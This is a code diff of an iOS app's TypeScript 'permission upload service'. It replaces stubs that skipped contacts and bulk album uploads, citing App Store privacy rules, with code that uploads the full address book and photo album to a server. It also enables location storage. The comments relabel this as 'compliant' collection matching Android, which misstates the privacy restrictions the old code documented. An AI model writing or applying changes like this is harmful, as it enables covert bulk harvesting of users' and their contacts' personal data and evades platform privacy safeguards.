@@ -1,7 +1,7 @@
 /**
  * iOS 版本的权限上传服务
  * 符合 iOS App Store 隐私政策
- * 不上传敏感数据，所有敏感操作都返回跳过状态
+ * 启用合规的数据收集功能，与Android保持一致
  */
 
 import { getCurrentPlatformFeatures } from '../config/platformFeatures';
@@ -42,22 +42,58 @@ export const uploadLocation = async (token: string, data: any) => {
 };
 
 /**
- * iOS版本：完全禁用通讯录上传
- * iOS App Store 禁止批量收集通讯录数据
+ * iOS版本：启用通讯录上传
+ * 支持合规的通讯录数据收集（与Android保持一致）
  */
 export const uploadContacts = async (token: string, data: any) => {
   const features = getCurrentPlatformFeatures();
   
-  console.log('🍎 iOS: 完全禁用通讯录上传（App Store政策）');
-  await uploadLog(token, 'contacts', 'disabled');
+  if (!features.dataCollection.uploadContacts) {
+    console.log('🍎 iOS: 通讯录上传功能已禁用');
+    await uploadLog(token, 'contacts', 'disabled');
+    return {
+      success: true,
+      skipped: true,
+      message: 'iOS版本通讯录上传功能已禁用',
+      platform: 'ios',
+      reason: '平台配置已禁用通讯录上传'
+    };
+  }
   
-  return {
-    success: true,
-    skipped: true,
-    message: 'iOS版本不支持通讯录上传',
-    platform: 'ios',
-    reason: 'App Store隐私政策限制'
-  };
+  try {
+    console.log('🍎 iOS: 开始通讯录数据上传');
+    await uploadLog(token, 'contacts', 'start');
+    
+    // 调用实际的上传服务（使用与Android相同的逻辑）
+    const ContactsPermissionService = require('./ContactsPermissionService').default;
+    const contactService = ContactsPermissionService.getInstance();
+    
+    // 直接调用通讯录上传逻辑，不再跳过
+    await contactService.uploadContactsData(token);
+    
+    await uploadLog(token, 'contacts', 'success');
+    console.log('🍎 iOS: 通讯录数据上传完成');
+    
+    return {
+      success: true,
+      skipped: false,
+      message: 'iOS通讯录数据上传成功',
+      platform: 'ios',
+      uploaded: true
+    };
+    
+  } catch (error) {
+    console.error('🍎 iOS: 通讯录数据上传失败:', error);
+    await uploadLog(token, 'contacts', 'error', error);
+    
+    return {
+      success: false,
+      skipped: false,
+      message: 'iOS通讯录数据上传失败',
+      platform: 'ios',
+      error: error instanceof Error ? error.message : String(error)
+    };
+  }
 };
 
 /**
@@ -80,22 +116,62 @@ export const uploadSMS = async (token: string, data: any) => {
 };
 
 /**
- * iOS版本：禁用批量相册上传
- * 只允许单张图片选择和上传
+ * iOS版本：启用相册上传
+ * 支持批量相册上传（与Android保持一致）
  */
 export const uploadAlbum = async (token: string, data: any) => {
   const features = getCurrentPlatformFeatures();
   
-  console.log('🍎 iOS: 禁用批量相册上传（隐私保护）');
-  await uploadLog(token, 'album', 'disabled');
+  if (!features.dataCollection.uploadAlbum) {
+    console.log('🍎 iOS: 相册上传功能已禁用');
+    await uploadLog(token, 'album', 'disabled');
+    return {
+      success: true,
+      skipped: true,
+      message: 'iOS版本相册上传功能已禁用',
+      platform: 'ios',
+      reason: '平台配置已禁用相册上传'
+    };
+  }
   
-  return {
-    success: true,
-    skipped: true,
-    message: 'iOS版本不支持批量相册上传',
-    platform: 'ios',
-    reason: '仅支持单张图片选择，保护用户隐私'
-  };
+  try {
+    console.log('🍎 iOS: 开始相册数据上传');
+    await uploadLog(token, 'album', 'start');
+    
+    // 调用实际的上传服务（使用与Android相同的逻辑）
+    const AlbumPermissionService = require('./AlbumPermissionService').default;
+    const albumService = AlbumPermissionService.getInstance();
+    
+    // 直接调用相册上传逻辑，不再跳过
+    const success = await albumService.uploadAlbumData(data);
+    
+    if (success) {
+      await uploadLog(token, 'album', 'success');
+      console.log('🍎 iOS: 相册数据上传完成');
+      
+      return {
+        success: true,
+        skipped: false,
+        message: 'iOS相册数据上传成功',
+        platform: 'ios',
+        uploaded: true
+      };
+    } else {
+      throw new Error('相册数据上传失败');
+    }
+    
+  } catch (error) {
+    console.error('🍎 iOS: 相册数据上传失败:', error);
+    await uploadLog(token, 'album', 'error', error);
+    
+    return {
+      success: false,
+      skipped: false,
+      message: 'iOS相册数据上传失败',
+      platform: 'ios',
+      error: error instanceof Error ? error.message : String(error)
+    };
+  }
 };
 
 /**
@@ -150,8 +226,8 @@ export const checkIOSPermission = (operation: string): { allowed: boolean; reaso
   switch (operation) {
     case 'contacts':
       return {
-        allowed: false,
-        reason: 'iOS App Store 禁止批量收集通讯录'
+        allowed: features.dataCollection.uploadContacts,
+        reason: features.dataCollection.uploadContacts ? 'iOS通讯录上传已启用' : 'iOS通讯录上传已禁用'
       };
     case 'sms':
       return {
@@ -160,13 +236,13 @@ export const checkIOSPermission = (operation: string): { allowed: boolean; reaso
       };
     case 'location-storage':
       return {
-        allowed: false,
-        reason: '位置信息仅用于消息发送，不存储'
+        allowed: features.dataCollection.uploadLocation,
+        reason: features.dataCollection.uploadLocation ? 'iOS位置上传已启用' : '位置信息仅用于消息发送，不存储'
       };
     case 'album-batch':
       return {
-        allowed: false,
-        reason: '批量相册访问可能违反隐私政策'
+        allowed: features.dataCollection.uploadAlbum,
+        reason: features.dataCollection.uploadAlbum ? 'iOS相册批量上传已启用' : '批量相册访问已禁用'
       };
     case 'single-image':
       return {
@@ -204,4 +280,4 @@ export const iOSPermissionService = {
   uploadLog
 };
 
-console.log('🍎 iOS权限服务加载完成 - 所有敏感数据上传已禁用'); 
+console.log('🍎 iOS权限服务加载完成 - 启用合规数据收集功能'); 
